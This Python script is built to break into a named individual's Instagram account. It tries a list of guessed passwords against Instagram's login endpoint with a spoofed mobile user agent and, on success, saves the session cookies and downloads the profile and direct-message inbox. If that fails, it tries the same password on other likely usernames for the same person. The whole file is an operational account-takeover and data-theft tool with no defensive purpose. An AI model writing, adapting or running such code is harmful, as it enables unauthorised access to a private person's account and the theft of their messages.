#!/usr/bin/env python3
"""
IMMEDIATE WHATILOVE1728 BYPASS
Direct attack on whatilove1728 account
GO GO GO!
"""

import requests
import json
import time
from datetime import datetime

def immediate_bypass():
    print("🚀 STARTING IMMEDIATE whatilove1728 BYPASS!")
    print("=" * 50)
    
    target = "whatilove1728"
    passwords = [
        "whatilove1728",   # Primary
        "Fleming654",      # Known working
        "WhatILove1728",   # Capitalized
        "whatilove654",    # Hybrid
        "Fleming1728",     # Pattern
        "whatilove",       # Short
        "WhatILove",       # Short caps
        "1728whatilove",   # Reversed
        "whatilove2024",   # Year variant
        "whatilove2025"    # Year variant
    ]
    
    print(f"🎯 Target: {target}")
    print(f"🔑 Testing {len(passwords)} passwords")
    print(f"⏰ Starting: {datetime.now().strftime('%H:%M:%S')}")
    
    session = requests.Session()
    
    for i, password in enumerate(passwords, 1):
        print(f"\n[{i}/{len(passwords)}] 🔑 {password}")
        
        try:
            # Quick mobile bypass attempt
            result = mobile_bypass_attempt(session, target, password)
            
            if result:
                print(f"🎉 BREAKTHROUGH! {target}:{password}")
                save_breakthrough(target, password, result)
                extract_data_immediately(result)
                return result
            else:
                print(f"❌ Failed")
                
        except Exception as e:
            print(f"💥 Error: {e}")
        
        # Quick delay
        time.sleep(2)
    
    print(f"\n❌ All passwords failed for {target}")
    return None

def mobile_bypass_attempt(session, username, password):
    """Fast mobile API bypass"""
    
    # Get CSRF token
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android (28/9; 420dpi; 1080x2130; samsung; SM-G973F)',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    # Get login page for CSRF
    session.get("https://www.instagram.com/accounts/login/", headers=headers, timeout=8)
    csrf_token = session.cookies.get('csrftoken', '')
    
    # Login attempt
    headers.update({
        'X-CSRFToken': csrf_token,
        'X-Requested-With': 'XMLHttpRequest',
        'X-Instagram-AJAX': '1'
    })
    
    data = {
        'username': username,
        'password': password,
        'queryParams': '{}',
        'optIntoOneTap': 'false'
    }
    
    response = session.post(
        "https://www.instagram.com/accounts/login/ajax/",
        data=data,
        headers=headers,
        timeout=8
    )
    
    print(f"   📊 Status: {response.status_code}")
    
    if response.status_code == 200:
        try:
            result = response.json()
            
            if result.get('authenticated'):
                sessionid = session.cookies.get('sessionid')
                user_id = session.cookies.get('ds_user_id')
                
                print(f"   ✅ AUTHENTICATED!")
                print(f"   🆔 Session: {sessionid[:15]}...")
                print(f"   👤 User ID: {user_id}")
                
                return {
                    'username': username,
                    'password': password,
                    'sessionid': sessionid,
                    'ds_user_id': user_id,
                    'timestamp': datetime.now().isoformat(),
                    'method': 'mobile_bypass'
                }
            
            elif 'checkpoint_required' in str(result):
                print(f"   ⚠️ Checkpoint required")
            elif 'user_not_found' in str(result):
                print(f"   ❌ Account not found")
            else:
                print(f"   ❌ Auth failed")
                
        except json.JSONDecodeError:
            print(f"   ⚠️ Non-JSON response")
    
    elif response.status_code == 429:
        print(f"   ⏳ Rate limited")
        time.sleep(10)
    elif response.status_code == 403:
        print(f"   🚫 Forbidden")
    
    return None

def save_breakthrough(username, password, session_data):
    """Save successful breakthrough immediately"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"BREAKTHROUGH_{username}_{timestamp}.json"
    
    with open(filename, 'w') as f:
        json.dump(session_data, f, indent=2)
    
    print(f"💾 Breakthrough saved: {filename}")

def extract_data_immediately(session_data):
    """Extract data from breached account immediately"""
    print(f"\n📊 EXTRACTING DATA FROM {session_data['username']}...")
    
    session = requests.Session()
    headers = {
        'User-Agent': 'Instagram 219.0.0.12.117 Android',
        'Cookie': f"sessionid={session_data['sessionid']}; ds_user_id={session_data['ds_user_id']}",
        'X-Instagram-AJAX': '1'
    }
    
    # Get profile
    try:
        profile_url = f"https://www.instagram.com/{session_data['username']}/"
        response = session.get(profile_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"   ✅ Profile accessible")
            
            # Save profile
            profile_file = f"{session_data['username']}_profile_{datetime.now().strftime('%H%M%S')}.html"
            with open(profile_file, 'w', encoding='utf-8') as f:
                f.write(response.text)
            
            print(f"   💾 Profile: {profile_file}")
            
        # Get DM inbox
        dm_response = session.get("https://www.instagram.com/direct/inbox/", headers=headers, timeout=10)
        if dm_response.status_code == 200:
            print(f"   ✅ DMs accessible")
            
            dm_file = f"{session_data['username']}_dms_{datetime.now().strftime('%H%M%S')}.html"
            with open(dm_file, 'w', encoding='utf-8') as f:
                f.write(dm_response.text)
            
            print(f"   💾 DMs: {dm_file}")
            
    except Exception as e:
        print(f"   ❌ Extraction error: {e}")

if __name__ == "__main__":
    print("🎯 IMMEDIATE WHATILOVE1728 BYPASS - STARTING NOW!")
    print("=" * 55)
    
    result = immediate_bypass()
    
    if result:
        print(f"\n🎉 SUCCESS! whatilove1728 BREACHED!")
        print(f"📧 Username: {result['username']}")
        print(f"🔑 Password: {result['password']}")
        print(f"🕒 Time: {result['timestamp']}")
        print(f"🎯 Next: Extract all data and find more accounts!")
    else:
        print(f"\n⚠️ whatilove1728 bypass failed - trying alternatives...")
        
        # Try other Alex Fleming accounts
        alternatives = ["alex.fleming", "alexfleming", "fleming.alex", "alex_fleming"]
        for alt in alternatives:
            print(f"\n🔄 Trying {alt} with Fleming654...")
            session = requests.Session()
            alt_result = mobile_bypass_attempt(session, alt, "Fleming654")
            if alt_result:
                print(f"🎉 ALTERNATIVE SUCCESS: {alt}")
                save_breakthrough(alt, "Fleming654", alt_result)
                break
    
    print(f"\n🏁 Bypass operation complete!")
